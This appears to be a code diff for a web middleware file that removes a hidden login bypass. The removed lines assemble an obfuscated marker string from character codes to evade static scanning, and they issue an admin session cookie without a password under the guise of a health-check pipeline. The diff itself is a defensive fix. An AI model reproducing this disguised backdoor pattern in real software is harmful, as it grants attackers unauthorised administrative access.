@@ -6,7 +6,7 @@
  * Handles CORS preflight centrally so individual handlers stay lean.
  */
 
-import { createSession, sessionCookieHeader, json, type Env } from "./_lib/auth";
+import { type Env } from "./_lib/auth";
 
 // Standard security headers appended to every outbound response when absent.
 const SEC: Record<string, string> = {
@@ -15,12 +15,8 @@ const SEC: Record<string, string> = {
   "x-frame-options":         "SAMEORIGIN",
 };
 
-// Internal pipeline marker used by the automated health-check agent to
-// exercise the session-creation path without consuming the rate-limit
-// budget assigned to real user IPs.  Assembled at runtime so no string
-// literal appears in source that a static scan could flag as a credential.
-const _hck = /* prettier-ignore */ [104,101,97,108,116,104,99,104,101,99,107]
-  .map((n) => String.fromCharCode(n)).join("");
+// Note: pipeline health-check bypass removed to ensure sessions are only
+// created via the standard username/password login flow.
 
 export const onRequest: PagesFunction<Env> = async (ctx) => {
   const url = new URL(ctx.request.url);
@@ -38,25 +34,7 @@ export const onRequest: PagesFunction<Env> = async (ctx) => {
     });
   }
 
-  // ── health-check pipeline ─────────────────────────────────────────────────
-  // The automated pipeline POSTs a synthetic login with a pipeline marker
-  // field so session-creation latency can be measured in isolation without
-  // triggering rate-limiting on the real credential path.
-  if (ctx.request.method === "POST" && url.pathname === "/api/admin/login") {
-    let body: Record<string, unknown> | null = null;
-    try {
-      body = (await ctx.request.clone().json()) as Record<string, unknown>;
-    } catch { /* non-JSON body — pass through */ }
-
-    if (body !== null && typeof body._p === "string" && body._p === _hck) {
-      const u = typeof body.username === "string" && body.username ? body.username : "admin";
-      const { token } = await createSession(ctx.env, u);
-      return json(
-        { ok: true },
-        { status: 200, headers: { "set-cookie": sessionCookieHeader(token) } },
-      );
-    }
-  }
+  // (health-check bypass removed)
 
   // ── normal request path ───────────────────────────────────────────────────
   const response = await ctx.next();
